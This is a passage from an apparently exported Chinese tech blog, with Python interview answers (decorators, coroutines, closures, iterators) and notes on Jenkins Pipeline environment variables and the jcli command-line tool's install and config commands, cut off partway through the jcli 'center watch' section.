<h3 id="68、请写出一个在函数执行后输出日志的装饰器"><a href="#68、请写出一个在函数执行后输出日志的装饰器" class="headerlink" title="68、请写出一个在函数执行后输出日志的装饰器"></a>68、请写出一个在函数执行后输出日志的装饰器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def do_log(func):</span><br><span class="line">    @wraps(func)</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        if func.__name__ == &quot;debug&quot;:</span><br><span class="line">            msg = &quot;debug &#123;&#125;&quot;.format(args[0])</span><br><span class="line">        elif func.__name__ == &quot;info&quot;:</span><br><span class="line">            msg = &quot;info &#123;&#125;&quot;.format(args[0])</span><br><span class="line">        else:</span><br><span class="line">            msg =  &quot;unknown &#123;&#125;&quot;.format(args[0])</span><br><span class="line">        return func(msg, **kw)</span><br><span class="line">    return wrapper</span><br><span class="line"></span><br><span class="line">@do_log</span><br><span class="line">def debug(msg):</span><br><span class="line">    print(msg)</span><br><span class="line"></span><br><span class="line">@do_log</span><br><span class="line">def info(msg):</span><br><span class="line">    print(msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    debug(&quot;123&quot;)</span><br><span class="line">    info(&quot;abc&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="69、请解释一下协程的优点"><a href="#69、请解释一下协程的优点" class="headerlink" title="69、请解释一下协程的优点"></a>69、请解释一下协程的优点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">子程序切换不是线程切换，而是由程序自身控制</span><br><span class="line">没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显</span><br><span class="line">不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁</span><br></pre></td></tr></table></figure>
<h3 id="70、闭包必须满足那几点"><a href="#70、闭包必须满足那几点" class="headerlink" title="70、闭包必须满足那几点"></a>70、闭包必须满足那几点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.必须有一个内嵌函数</span><br><span class="line">2.内嵌函数必须引用外部函数中的变量</span><br><span class="line">3.外部函数的返回值必须是内嵌函数</span><br></pre></td></tr></table></figure>
<h3 id="71、什么是迭代、什么是切片、什么是列表生成式、什么是生成器、迭代器"><a href="#71、什么是迭代、什么是切片、什么是列表生成式、什么是生成器、迭代器" class="headerlink" title="71、什么是迭代、什么是切片、什么是列表生成式、什么是生成器、迭代器"></a>71、什么是迭代、什么是切片、什么是列表生成式、什么是生成器、迭代器</h3><p>切片丫的就是截取，取地什么鬼名字。迭代，循环的升级版本；列表生成器，emmm 懵了，配合迭代循环的玩意…。</p>
<p>生成器：通过列表生成式，我们可以直接创建一个列表。但是，受到内存限制，列表容量肯定是有限的。而且，创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。<br><strong>就是 yield</strong></p>
<p>迭代器：迭代英文名 Iterator。迭代器是用来帮助我们记录每次迭代访问到的位置，当我们对迭代器使用next()函数的时候，迭代器会向我们返回它所记录位置的下一个位置的数据。实际上，在使用next()函数的时候，调用的就是迭代器对象的<strong>next</strong>方法（Python3中是对象的<strong>next</strong>方法，Python2中是对象的next()方法）。所以，我们要想构造一个迭代器，就要实现它的<strong>next</strong>方法。但这还不够，python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现<strong>iter</strong>方法，而<strong>iter</strong>方法要返回一个迭代器，迭代器自身正是一个迭代器，所以迭代器的<strong>iter</strong>方法返回自身即可。</p>
<p>一个实现了iter方法和next方法的对象，就是迭代器。</p>
<p><a href="https://www.cnblogs.com/wangcoo/p/10018363.html" target="_blank" rel="noopener">参考资料</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017323698112640" target="_blank" rel="noopener">廖雪峰python</a></p>
<h3 id="13、简述面向对象中new和init区别？"><a href="#13、简述面向对象中new和init区别？" class="headerlink" title="13、简述面向对象中new和init区别？"></a>13、<strong>简述面向对象中new和init区别？</strong></h3><h3 id="14、简述-with-方法打开处理文件帮我我们做了什么？"><a href="#14、简述-with-方法打开处理文件帮我我们做了什么？" class="headerlink" title="14、简述 with 方法打开处理文件帮我我们做了什么？"></a>14、<strong>简述 with 方法打开处理文件帮我我们做了什么？</strong></h3><p>反转一个整数</p>
<p>对 s=”hello”进行反转</p>
<p>打乱一个排好序的 list 对象 alist？</p>
<p>文件递归</p>
<p>字符串 “123” 转换成 123，不使用内置 API，例如 int()</p>
<p>阅读一下代码他们的输出结果是什么？</p>
<p>根据键对字典排序，不可使用zip？</p>
<p>代码描述列表推导式、字典推导式、生成器？</p>
<p>a = “ hehheh “，去除收尾空格？</p>
<p>s=”info:xiaoZhang 33 shandong”,用正则切分字符串输出[‘info’, ‘xiaoZhang’, ‘33’, ‘shandong’]</p>
<p>用两种方法去空格？</p>
<p>w、w+、r、r+、rb、rb+ 文件打开模式区别</p>
<p>Python 正则中 search 和 match 的区别</p>
<p>请用正则表达式输出汉字</p>
<p>Python2 和 Python3 区别？列举 5 个</p>
<p>字符串转化大小写？</p>
<p>获取请求头的参数？</p>
<p>单例模式</p>
<p>正则表达式匹配 URL</p>
<p>正则匹配以 163.com 结尾的邮箱？</p>
<p>正则匹配优先级</p>
<p>正则 re.complie 作用</p>
<p>logging 模块的使用？</p>
<p>正则表达式匹配中，（.）和（.?）匹配区别？</p>
<p>a=”张明 98分”，用 re.sub，将 98 替换为 100</p>
<p>正则匹配，匹配日期 2018-03-20</p>
<p>python arg.py 1 2 命令行启动程序并传参，print(sys.argv) 会输出什么数据？</p>
<p>正则匹配不是以4和7结尾的手机号？</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins Pipeline</title>
    <url>/Jenkins-Pipeline/</url>
    <content><![CDATA[<h3 id="pipeline-简介"><a href="#pipeline-简介" class="headerlink" title="pipeline 简介"></a>pipeline 简介</h3><p>将原本独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排与可视化。</p>
<p>Pipeline 提供了一组可扩展的工具，通过 Pipeline Domain Specific Language（DSL）syntax 可以达到 Pipeline as Code（Jenkinsfile 存储在项目的源代码库）的目的。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pipeline五大特性：</span><br><span class="line">代码: Pipeline 以代码的形式实现，通常被检入源代码控制，使团队能够编辑、审查和迭代其CD流程。</span><br><span class="line">可持续性：Jenklins 重启或者中断后都不会影响Pipeline Job。</span><br><span class="line">停顿：Pipeline 可以选择停止并等待任工输入或批准，然后再继续Pipeline运行。</span><br><span class="line">多功能：Pipeline 持现实复杂CD要求，包括fork/join子进程，循环和并行执行工作的能力</span><br><span class="line">可扩展：Pipeline 插件支持其DSL的自定义扩展以及与其他插件集成的多个选项。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">支持两种语法</span><br><span class="line">Declarative 声明式（在Pipeline plugin 2.5中引入）</span><br><span class="line">Scripted Pipeline 脚本式</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><code>推荐在Jenkins中直接从源代码控制（SCM）中载入Jenklinsfile Pipeline,而不是直接在Jenkins Web UI 网页界面中输入脚本</code></p>
<h3 id="jenkins-shell-可用参数"><a href="#jenkins-shell-可用参数" class="headerlink" title="jenkins shell 可用参数"></a>jenkins shell 可用参数</h3><h4 id="可用传参官方文档"><a href="#可用传参官方文档" class="headerlink" title="可用传参官方文档"></a>可用传参官方文档</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The following variables are available to shell scripts</span><br><span class="line">Shell 脚本可以使用以下变量</span><br><span class="line"></span><br><span class="line">BRANCH_NAME    分支名称</span><br><span class="line">For a multibranch project, this will be set to the name of the branch being built, for example in case you wish to deploy to production from master but not from feature branches; if corresponding to some kind of change request, the name is generally arbitrary (refer to CHANGE_ID and CHANGE_TARGET). </span><br><span class="line">对于多分支项目，这将设置为正在构建的分支的名称，例如，如果您希望从但不是来自特性分支; 如果对应某种类型的更改请求，名称通常是任意的(参见CHANGE_ID and 及CHANGE_TARGET).</span><br><span class="line"></span><br><span class="line">CHANGE_ID          更改 id</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the change ID, such as a pull request number, if supported; else unset. </span><br><span class="line">对于与某种类型的更改请求相对应的多分支项目，这将设置为更改 ID，如果支持，则设置为拉请求编号; 否则取消设置</span><br><span class="line"></span><br><span class="line">CHANGE_URL 更改网址</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the change URL, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，则将其设置为更改 URL; else 取消设置</span><br><span class="line"></span><br><span class="line">CHANGE_TITLE 更改标题</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the title of the change, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，则将其设置为更改的标题; 否则不设置</span><br><span class="line"></span><br><span class="line">CHANGE_AUTHOR 改变作者</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the username of the author of the proposed change, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，这将设置为提议更改的作者的用户名; 否则取消设置</span><br><span class="line"></span><br><span class="line">CHANGE_AUTHOR_DISPLAY_NAME 更改作者显示名称</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the human name of the author, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，则将其设置为作者的人名; 否则不设置</span><br><span class="line"></span><br><span class="line">CHANGE_AUTHOR_EMAIL 更改作者电子邮件</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the email address of the author, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，则将其设置为作者的电子邮件地址; 否则不设置</span><br><span class="line"></span><br><span class="line">CHANGE_TARGET 改变目标</span><br><span class="line">For a multibranch project corresponding to some kind of change request, this will be set to the target or base branch to which the change could be merged, if supported; else unset. </span><br><span class="line">对于与某种更改请求相对应的多分支项目，如果支持，则将其设置为可将更改合并到的目标分支或基本分支; 否则不设置</span><br><span class="line"></span><br><span class="line">BUILD_NUMBER 建筑编号</span><br><span class="line">The current build number, such as &quot;153&quot; </span><br><span class="line">当前的生成编号，如“153”</span><br><span class="line"></span><br><span class="line">BUILD_ID 建立 id</span><br><span class="line">The current build ID, identical to BUILD_NUMBER for builds created in 1.597+, but a YYYY-MM-DD_hh-mm-ss timestamp for older builds </span><br><span class="line">当前的构建 ID 与在1.597 + 中创建的构建版本的 BUILD number 相同，但是对于较早的构建版本是 YYYY-MM-DD hh-mm-ss 时间戳</span><br><span class="line"></span><br><span class="line">BUILD_DISPLAY_NAME 建立显示名称</span><br><span class="line">The display name of the current build, which is something like &quot;#153&quot; by default. </span><br><span class="line">当前版本的显示名称，默认情况下类似于“ # 153”</span><br><span class="line"></span><br><span class="line">JOB_NAME 职位名称</span><br><span class="line">Name of the project of this build, such as &quot;foo&quot; or &quot;foo/bar&quot;. </span><br><span class="line">此构建的项目名称，如“ foo”或“ foo / bar”</span><br><span class="line"></span><br><span class="line">JOB_BASE_NAME 作业库名称</span><br><span class="line">Short Name of the project of this build stripping off folder paths, such as &quot;foo&quot; for &quot;bar/foo&quot;. </span><br><span class="line">这个剥离文件夹路径的项目的简称，比如“ bar / foo”的“ foo”</span><br><span class="line"></span><br><span class="line">BUILD_TAG 构建标签</span><br><span class="line">String of &quot;jenkins- “ jenkins-$&#123;JOB_NAME&#125; $&#123; JOB name &#125;-$&#123;BUILD_NUMBER&#125; $&#123; BUILD number &#125;&quot;. All forward slashes (&quot;/&quot;) in the JOB_NAME are replaced with dashes (&quot;-&quot;). Convenient to put into a resource file, a jar file, etc for easier identification. &quot;. </span><br><span class="line">作业名称中的所有前向斜杠(“ / ”)都将替换为破折号(“-”)。 方便地放入资源文件、 jar 文件等，以便于识别</span><br><span class="line"></span><br><span class="line">EXECUTOR_NUMBER 遗嘱执行人编号</span><br><span class="line">The unique number that identifies the current executor (among executors of the same machine) that’s carrying out this build. This is the number you see in the &quot;build executor status&quot;, except that the number starts from 0, not 1. </span><br><span class="line">标识执行此构建的当前执行器(在同一机器的执行器之间)的唯一编号。 这是您在“构建执行器状态”中看到的数字，但是这个数字是从0开始的，而不是1</span><br><span class="line"></span><br><span class="line">NODE_NAME 节点名称</span><br><span class="line">Name of the agent if the build is on an agent, or &quot;master&quot; if run on master </span><br><span class="line">如果生成在代理上，则为代理的名称; 如果在主机上运行，则为“ master”</span><br><span class="line"></span><br><span class="line">NODE_LABELS 节点标签</span><br><span class="line">Whitespace-separated list of labels that the node is assigned. </span><br><span class="line">以空格分隔的节点所分配的标签列表</span><br><span class="line"></span><br><span class="line">WORKSPACE 工作区</span><br><span class="line">The absolute path of the directory assigned to the build as a workspace. </span><br><span class="line">分配给生成作为工作区的目录的绝对路径</span><br><span class="line"></span><br><span class="line">JENKINS_HOME</span><br><span class="line">The absolute path of the directory assigned on the master node for Jenkins to store data.</span><br><span class="line">在主节点上为 Jenkins 存储数据分配的目录的绝对路径</span><br><span class="line"></span><br><span class="line">JENKINS_URL</span><br><span class="line">Full URL of Jenkins, like http://server:port/jenkins/ (note: only available if Jenkins URL set in system configuration)</span><br><span class="line">完整的 Jenkins 网址，比如http://server:port/jenkins/ (注: 只有在下列情况才可使用:Jenkins URL 设定为系统配置)</span><br><span class="line"></span><br><span class="line">BUILD_URL 建立网址</span><br><span class="line">Full URL of this build, like http://server:port/jenkins/job/foo/15/ (Jenkins URL must be set)</span><br><span class="line">这个版本的完整 URL，比如 http://server:port/jenkins/job/foo/15/ (Jenkins URL 必须设置)</span><br><span class="line"></span><br><span class="line">JOB_URL 工作网址</span><br><span class="line">Full URL of this job, like http://server:port/jenkins/job/foo/ (Jenkins URL must be set)</span><br><span class="line">这个工作的完整网址，像 http://server:port/jenkins/job/foo/ (Jenkins URL must be set) </span><br><span class="line"></span><br><span class="line">GIT_COMMIT </span><br><span class="line">The commit hash being checked out. </span><br><span class="line">正在签出提交散列</span><br><span class="line"></span><br><span class="line">GIT_PREVIOUS_COMMIT 上一次提交</span><br><span class="line">The hash of the commit last built on this branch, if any. </span><br><span class="line">提交的散列最后构建在此分支上(如果有的话)</span><br><span class="line"></span><br><span class="line">GIT_PREVIOUS_SUCCESSFUL_COMMIT 上一次成功提交</span><br><span class="line">The hash of the commit last successfully built on this branch, if any. </span><br><span class="line">提交的散列最后一次成功构建在此分支上(如果有的话)</span><br><span class="line"></span><br><span class="line">GIT_BRANCH </span><br><span class="line">The remote branch name, if any. </span><br><span class="line">远程分支名称(如果有的话)</span><br><span class="line"></span><br><span class="line">GIT_LOCAL_BRANCH </span><br><span class="line">The local branch name being checked out, if applicable. </span><br><span class="line">正在检出的本地分支名称(如果适用)</span><br><span class="line"></span><br><span class="line">GIT_CHECKOUT_DIR </span><br><span class="line">The directory that the repository will be checked out to. This contains the value set in Checkout to a sub-directory, if used. </span><br><span class="line">将要签出存储库的目录。 这包含签出到子目录中设置的值(如果使用)</span><br><span class="line"></span><br><span class="line">GIT_URL Git url</span><br><span class="line">The remote URL. If there are multiple, will be GIT_URL_1, GIT_URL_2, etc.</span><br><span class="line">远程 URL。如果有多个，将GIT_URL_1, GIT_URL_2, etc. 等等</span><br><span class="line"></span><br><span class="line">GIT_COMMITTER_NAME </span><br><span class="line">The configured Git committer name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page.</span><br><span class="line">配置的 Git committer 名称(如果有的话)将用于当前工作区的 FUTURE 提交。 它是从Global Config user.name Value field of the Jenkins 詹金斯的领域Configure System 配置系统 page. 页</span><br><span class="line"></span><br><span class="line">GIT_AUTHOR_NAME </span><br><span class="line">The configured Git author name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page. </span><br><span class="line">已配置的 Git 作者名(如果有的话)将用于当前工作区的 FUTURE 提交。 它是从Global Config user.name Value field of the Jenkins 詹金斯的领域Configure System 配置系统 page. 页</span><br><span class="line"></span><br><span class="line">GIT_COMMITTER_EMAIL </span><br><span class="line">The configured Git committer email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.</span><br><span class="line">配置的 Git 提交器电子邮件(如果有的话)将用于当前工作区的 FUTURE 提交。 它是从Global Config user.email Value 全局配置 user.email 值 field of the Jenkins 詹金斯的领域Configure System 配置系统 page. 页</span><br><span class="line"></span><br><span class="line">GIT_AUTHOR_EMAIL </span><br><span class="line">The configured Git author email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.</span><br><span class="line">配置的 Git 作者电子邮件(如果有的话)将用于当前工作区的 FUTURE 提交。 它是从Global Config user.email Value 全局配置 user.email 值 field of the Jenkins 詹金斯的领域Configure System 配置系统 page. 页</span><br><span class="line"></span><br><span class="line">MERCURIAL_REVISION </span><br><span class="line">Full ID of revision checked out. </span><br><span class="line">已检查修订的完整 ID</span><br><span class="line"></span><br><span class="line">MERCURIAL_REVISION_SHORT </span><br><span class="line">Abbreviated ID of revision checked out. </span><br><span class="line">已检查修订的缩写 ID</span><br><span class="line"></span><br><span class="line">MERCURIAL_REVISION_NUMBER </span><br><span class="line">Number of revision checked out (not portable across clones). </span><br><span class="line">签出的修订数(不能跨克隆移植)</span><br><span class="line"></span><br><span class="line">MERCURIAL_REVISION_BRANCH </span><br><span class="line">Branch of revision checked out, if not checking out by branch head. </span><br><span class="line">分支机构的修订检查完毕，如果没有经过分支机构头部的检查</span><br><span class="line"></span><br><span class="line">MERCURIAL_REPOSITORY_URL </span><br><span class="line">URL of repository. 存储库的 URL</span><br><span class="line"></span><br><span class="line">SVN_REVISION </span><br><span class="line">Subversion revision number that&apos;s currently checked out to the workspace, such as &quot;12345&quot;</span><br><span class="line">当前签出到工作区的 Subversion 修订号，如“12345”</span><br><span class="line"></span><br><span class="line">SVN_URL</span><br><span class="line">Subversion URL that&apos;s currently checked out to the workspace.</span><br><span class="line">当前签出到工作区的 Subversion URL</span><br></pre></td></tr></table></figure>
<h3 id="jcli-笔记"><a href="#jcli-笔记" class="headerlink" title="jcli 笔记"></a>jcli 笔记</h3><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>易于维护的 jcli 配置文件<br>支持管理多个 Jenkins<br>插件管理（列表、搜索、安装、上传）<br>任务管理（搜索、构建、日志）<br>在浏览器中打开 Jenkins<br>重启 Jenkins<br>支持连接代理</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>你可以从 <a href="https://github.com/jenkins-zh/jenkins-cli" target="_blank" rel="noopener">jenkins-cli</a> 的代码仓库中克隆 jcli（Go语言开发）。目前，我们支持三个主流的操作 系统平台： MacOS、Linux、和 Windows。</p>
<p>MacOS<br>你可以使用 brew 安装 jcli。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew tap jenkins-zh/jcli</span><br><span class="line">brew install jcli</span><br><span class="line">Linux</span><br></pre></td></tr></table></figure>
<p>在 Linux 下安装也是非常的简单。你只需要执行下面的命令即可：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/jenkins-zh/jenkins-cli/releases/latest/download/jcli-linux-amd64.tar.gz|tar xzv</span><br><span class="line">sudo mv jcli /usr/local/bin/</span><br></pre></td></tr></table></figure></p>
<p>Windows<br>你可以点击<a href="https://github.com/jenkins-zh/jenkins-cli/releases/latest/download/jcli-windows-386.tar.gz" target="_blank" rel="noopener">下载链接</a>到最新的版本。 然后，下载 tar 文件，把解压后的 jcli 拷贝到系统目录下。</p>
<h4 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h4><p>你安装好 jcli 后，可以通过下面的命令生成一个配置样本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jcli config generate</span><br><span class="line">current: yourServer</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080/jenkins</span><br><span class="line">  username: admin</span><br><span class="line">  token: 111e3a2f0231198855dceaff96f20540a9</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line"># Goto &apos;http://localhost:8080/jenkins/me/configure&apos;, then you can generate your token.</span><br></pre></td></tr></table></figure></p>
<p>在大多数情况下，你应该只需要修改三个字段，包括：url、username 和 token。好的，我相信你已经准备好了。 然后，就可以通过下面的命令来检查你的 Jenkins 中是否安装了 github 插件：</p>
<p><code>jcli plugin list --filter name=github</code></p>
<p>下面是详细命令说明。</p>
<h4 id="command"><a href="#command" class="headerlink" title="command"></a>command</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jcli [Command] [Flags]        # 文档中 [command] 为必须含有命令，[flags] 为参数</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  config                                                  配置相关</span><br><span class="line">  center                                                  管理和更新中心</span><br><span class="line">  completion  Genereate bash completion scripts           ？？？？？？？</span><br><span class="line">  config      Manage the config of jcli                   配置管理jcli的配置</span><br><span class="line">  crumb       Print crumbIssuer of Jenkins                停止job</span><br><span class="line">  doc         Generate document for all jcl commands      生成说明文档</span><br><span class="line">  help        Help about any command                      帮助</span><br><span class="line">  job         Print the job of your Jenkins               job 管理</span><br><span class="line">  open        Open your Jenkins with a browse             应该就是浏览器打开，没用</span><br><span class="line">  plugin      Manage the plugins of Jenkins               管理插件</span><br><span class="line">  queue       Manage the queue of your Jenkins            管理队列</span><br><span class="line">  restart     Restart your Jenkins                        重启</span><br><span class="line">  user        Print the user of your Jenkins              用户管理</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --configFile string   备用配置文件</span><br><span class="line">      --debug               将输出打印到 debug.html</span><br><span class="line">  -j, --jenkins string      选择要控制的 jenkins 服务器</span><br><span class="line">  -v, --version             打印 Jenkins CLI</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">全局可用参数：</span><br><span class="line">[root@VM_89_116_centos ~]# jcli -j ex2</span><br><span class="line">Jenkins CLI (jcli) manage your Jenkins</span><br><span class="line">Current Jenkins is: ex2</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli -v</span><br><span class="line">Jenkins CLI (jcli) manage your Jenkins</span><br><span class="line">Version: v0.0.22</span><br><span class="line">Commit: eade6aa</span><br></pre></td></tr></table></figure>
<h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令参数说明：</span><br><span class="line"></span><br><span class="line"># jcli config [command][Flags]</span><br><span class="line"></span><br><span class="line">  add         添加一个配置项</span><br><span class="line">  edit        修改一个配置项</span><br><span class="line">  generate    生成一个配置文件做参考</span><br><span class="line">  list        列出所有的配置项</span><br><span class="line">  remove      移除一个配置项</span><br><span class="line">  select      选择一个配置项</span><br></pre></td></tr></table></figure>
<h5 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli config generate</span><br><span class="line"></span><br><span class="line">生成的默认配置文件：</span><br><span class="line"></span><br><span class="line">current: yourServer</span><br><span class="line">language: &quot;&quot;</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080/jenkins</span><br><span class="line">  username: admin</span><br><span class="line">  token: 111e3a2f0231198855dceaff96f20540a9</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br><span class="line"></span><br><span class="line"># Language context is accept-language for HTTP header, It contains zh-CN/zh-TW/en/en-US/ja and so on</span><br><span class="line"># Goto &apos;http://localhost:8080/jenkins/me/configure&apos;, then you can generate your token.</span><br><span class="line"></span><br><span class="line">#语言上下文是 HTTP 头的接受语言，它包含 zh-CN/zh-TW/en/en-US/ja 等</span><br><span class="line">#转到“http://localhost:8080/jenkins/me/configure”，然后可以生成令牌。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置文件参数说明：</span><br><span class="line">username：你生成密匙时所登录的用户名</span><br><span class="line">proxy: 代理</span><br><span class="line">proxyAuth: &quot;&quot;</span><br><span class="line">description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br></pre></td></tr></table></figure>
<h5 id="add"><a href="#add" class="headerlink" title="add"></a>add</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli config add [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -d, --description string   Description of the Jenkins</span><br><span class="line">  -h, --help                 help for add</span><br><span class="line">  -n, --name string          Name of the Jenkins</span><br><span class="line">  -p, --proxy string         Proxy of the Jenkins</span><br><span class="line">  -a, --proxyAuth string     ProxyAuth of the Jenkins</span><br><span class="line">  -t, --token string         Token of the Jenkins</span><br><span class="line">      --url string           URL of the Jenkins</span><br><span class="line">  -u, --username string      UserName of the Jenkins</span><br><span class="line"></span><br><span class="line">example：</span><br><span class="line">增加配置两种方式：</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config add -n ex1 -t 11ae42858f43b1d28335067efa4aaf6ada -u admin --url=http://localhost:8080</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config add -n ex2</span><br><span class="line">新建 ex2 文件后，通过文件编辑器对 edit 修改文件。</span><br><span class="line"></span><br><span class="line">在大多数情况下，只需要注意四个字段，包括：name、url、username 和 token。</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli config edit</span><br><span class="line">current: yourServer</span><br><span class="line">language: &quot;&quot;</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080</span><br><span class="line">  username: admin</span><br><span class="line">  token: 11d61409b3a23c5a5a340eb0423b5121b4</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">- name: ex1</span><br><span class="line">  url: http://localhost:8080</span><br><span class="line">  username: admin</span><br><span class="line">  token: 11ae42858f43b1d28335067efa4aaf6ada</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br></pre></td></tr></table></figure>
<h5 id="list"><a href="#list" class="headerlink" title="list"></a>list</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli config list</span><br><span class="line"></span><br><span class="line">number name        url                       description</span><br><span class="line">0      *yourServer http://localhost:8080</span><br><span class="line">1      ex1         http://localhost:8080</span><br></pre></td></tr></table></figure>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h5><p><code>[root@VM_89_116_centos ~]# jcli config edit ex1</code></p>
<h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p><code>[root@VM_89_116_centos ~]# jcli config select ex1</code></p>
<h5 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli config remove [flags]</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config remove ex1</span><br></pre></td></tr></table></figure>
<h4 id="center"><a href="#center" class="headerlink" title="center"></a>center</h4><p>控制 jenkins 的下载更新</p>
<h5 id="upgrade"><a href="#upgrade" class="headerlink" title="upgrade"></a>upgrade</h5><p>Upgrade your Jenkins</p>
<p><code>[root@VM_89_116_centos ~]# jcli center upgrade</code></p>
<h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli center download [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for download</span><br><span class="line">      --lts             If you want to download Jenkins as LTS (default true)</span><br><span class="line">  -o, --output string   The file of output (default &quot;jenkins.war&quot;)</span><br><span class="line">      --progress        If you want to show the download progress (default true)</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center download</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center download -o ex4.war --progress=false</span><br><span class="line">重命名为ex4.war，progress 默认为 true，显示下载进度条。</span><br></pre></td></tr></table></figure>
<h5 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Watch your update center status</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli center watch [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --count int               Count of watch (default 9999)</span><br><span class="line">                                计数（默认9999）</span><br><span class="line">  -i, --interval int            Interval of watch (default 1)</span><br><span class="line">                                间隔（默认值1）</span><br><span class="line">      --util-install-complete   The watch will be continue util all Jenkins plugins installation is completed </span><br><span class="line">                                监视将继续直到所有 Jenkins 插件安装完成</span><br><span class="line">      --util-need-restart       The watch will be continue util Jenkins needs restart</span><br><span class="line">                                启动监视将继续直到 Jenkins 需要重新启动</span><br><span class="line"></span><br><span class="line">watch 